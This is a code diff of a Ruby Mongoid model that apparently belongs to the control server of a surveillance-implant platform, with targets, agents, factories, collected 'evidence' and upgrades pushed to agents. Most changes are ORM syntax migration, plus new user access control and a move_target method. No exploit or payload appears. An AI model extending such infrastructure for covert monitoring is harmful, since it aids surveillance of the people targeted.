@@ -56,6 +56,8 @@ class Item
   scope :agents, where(_kind: 'agent')
   scope :factories, where(_kind: 'factory')
 
+  # for the access control
+  has_and_belongs_to_many :users, :dependent => :nullify, :autosave => true, inverse_of: nil, index: true
   has_and_belongs_to_many :groups, :dependent => :nullify, :autosave => true
 
   embeds_many :filesystem_requests, class_name: "FilesystemRequest"
@@ -68,14 +70,14 @@ class Item
 
   embeds_many :configs, class_name: "Configuration"
 
-  index :name
-  index :status
-  index :_kind
-  index :ident
-  index :instance
-  index :path
+  index({name: 1}, {background: true})
+  index({status: 1}, {background: true})
+  index({_kind: 1}, {background: true})
+  index({ident: 1}, {background: true})
+  index({instance: 1}, {background: true})
+  index({path: 1}, {background: true})
 
-  store_in :items
+  store_in collection: 'items'
 
   after_create :create_callback
   before_destroy :destroy_callback
@@ -117,7 +119,7 @@ class Item
       when 'operation'
         self.stat.size = 0
         self.stat.grid_size = 0
-        targets = Item.where(_kind: 'target').also_in(path: [self._id]).only(:stat)
+        targets = Item.where(_kind: 'target').in(path: [self._id]).only(:stat)
         targets.each do |t|
           self.stat.size += t.stat.size
           self.stat.grid_size += t.stat.grid_size
@@ -129,7 +131,7 @@ class Item
       when 'target'
         self.stat.evidence = {}
         self.stat.dashboard = {}
-        agents = Item.where(_kind: 'agent', deleted: false).also_in(path: [self._id]).only(:stat)
+        agents = Item.where(_kind: 'agent', deleted: false).in(path: [self._id]).only(:stat)
         agents.each do |a|
           self.stat.evidence.merge!(a.stat.evidence) {|k,o,n| o+n }
           self.stat.dashboard.merge!(a.stat.dashboard) {|k,o,n| o+n }
@@ -137,7 +139,7 @@ class Item
             self.stat.last_sync = a.stat.last_sync
           end
         end
-        db = Mongoid.database
+        db = RCS::DB::DB.instance.mongo_connection
         # evidence size
         collection = db.collection('evidence.' + self._id.to_s)
         self.stat.size = collection.stats['size'].to_i
@@ -162,6 +164,31 @@ class Item
     end
   end
 
+  def move_target(operation)
+    self.path = [operation._id]
+    self.save
+
+    # update the path in alerts and connectors
+    ::Alert.all.each {|a| a.update_path(self._id, self.path + [self._id])}
+    ::Connector.all.each {|a| a.update_path(self._id, self.path + [self._id])}
+
+    # move every agent and factory belonging to this target
+    Item.any_in({_kind: ['agent', 'factory']}).in({path: [ self._id ]}).each do |agent|
+      agent.path = self.path + [self._id]
+      agent.save
+
+      # update the path in alerts and connectors
+      ::Alert.all.each {|a| a.update_path(agent._id, agent.path + [agent._id])}
+      ::Connector.all.each {|a| a.update_path(agent._id, agent.path + [agent._id])}
+    end
+
+    # also move the linked entity
+    Entity.any_in({type: :target}).in({path: [ self._id ]}).each do |entity|
+      entity.path = self.path + [self._id]
+      entity.save
+    end
+  end
+
   def get_parent
     ::Item.find(self.path.last)
   end
@@ -177,6 +204,7 @@ class Item
     agent.type = self[:type]
     agent.desc = self[:desc]
     agent[:path] = self[:path]
+    agent.users = self.users
     agent.confkey = self[:confkey]
     agent.logkey = self[:logkey]
     agent.seed = self[:seed]
@@ -297,12 +325,12 @@ class Item
 
   def add_upgrade(name, file)
     # make sure to overwrite the new upgrade
-    self.upgrade_requests.destroy_all(conditions: { filename: name })
+    self.upgrade_requests.destroy_all(filename: name)
 
     content = File.open(file, 'rb+') {|f| f.read}
     raise "Cannot read from file #{file}" if content.nil?
 
-    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'})] })
+    self.upgrade_requests.create!({filename: name, _grid: RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'}) })
   end
 
   def upgrade!
@@ -442,7 +470,7 @@ class Item
         # destroy all the agents of this target
         # to speed up the process, set the DROPPING flag.
         # during callbacks the agent will not delete the evidence
-        Item.any_in({_kind: ['factory', 'agent']}).also_in({path: [ self._id ]}).each do |agent|
+        Item.any_in({_kind: ['factory', 'agent']}).in({path: [ self._id ]}).each do |agent|
           agent[:dropping] = true
           agent.save
           agent.destroy
@@ -457,14 +485,14 @@ class Item
         # dropping flag is set only by cascading from target
         unless self[:dropping]
           trace :info, "Deleting evidence for agent #{self.name}..."
-          Evidence.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
+          Evidence.collection_class(self.path.last).destroy_all(aid: self._id.to_s)
           trace :info, "Deleting aggregates for agent #{self.name}..."
-          Aggregate.collection_class(self.path.last).destroy_all(conditions: { aid: self._id.to_s })
+          Aggregate.collection_class(self.path.last).destroy_all(aid: self._id.to_s)
           trace :info, "Deleting evidence for agent #{self.name} done."
         end
       when 'factory'
         # delete all the pushed documents of this factory
-        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
+        ::PublicDocument.destroy_all(factory: [self[:_id]])
     end
 
     RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'destroy'})
@@ -486,7 +514,7 @@ class Item
     return if self._kind != 'target'
 
     # create the collection for the target's evidence and shard it
-    db = Mongoid.database
+    db = RCS::DB::DB.instance.mongo_connection
     collection = db.collection(Evidence.collection_name(self._id))
     # ensure indexes
     Evidence.collection_class(self._id).create_indexes
@@ -554,13 +582,13 @@ class Item
           target.save
         end
       when 'target'
-        Item.any_in({_kind: ['agent', 'factory']}).also_in({path: [ self._id ]}).each do |agent|
+        Item.any_in({_kind: ['agent', 'factory']}).in({path: [ self._id ]}).each do |agent|
           agent.status = 'closed'
           agent.save
         end
       when 'factory'
         # delete all the pushed documents of this factory
-        ::PublicDocument.destroy_all({conditions: {factory: [self[:_id]]}})
+        ::PublicDocument.destroy_all(factory: [self[:_id]])
     end
   end
 
@@ -606,7 +634,7 @@ class UpgradeRequest
   include Mongoid::Document
   
   field :filename, type: String
-  field :_grid, type: Array
+  field :_grid, type: Moped::BSON::ObjectId
 
   validates_uniqueness_of :filename
 
@@ -616,7 +644,7 @@ class UpgradeRequest
 
   def destroy_upgrade_callback
     # remove the content from the grid
-    RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
+    RCS::DB::GridFS.delete self[:_grid] unless self[:_grid].nil?
   end
 
 end
@@ -626,7 +654,7 @@ class UploadRequest
   
   field :filename, type: String
   field :sent, type: Integer, :default => 0
-  field :_grid, type: Array
+  field :_grid, type: Moped::BSON::ObjectId
   field :_grid_size, type: Integer
 
   embedded_in :item
@@ -635,7 +663,7 @@ class UploadRequest
 
   def destroy_upload_callback
     # remove the content from the grid
-    RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
+    RCS::DB::GridFS.delete self[:_grid] unless self[:_grid].nil?
   end
 end
 
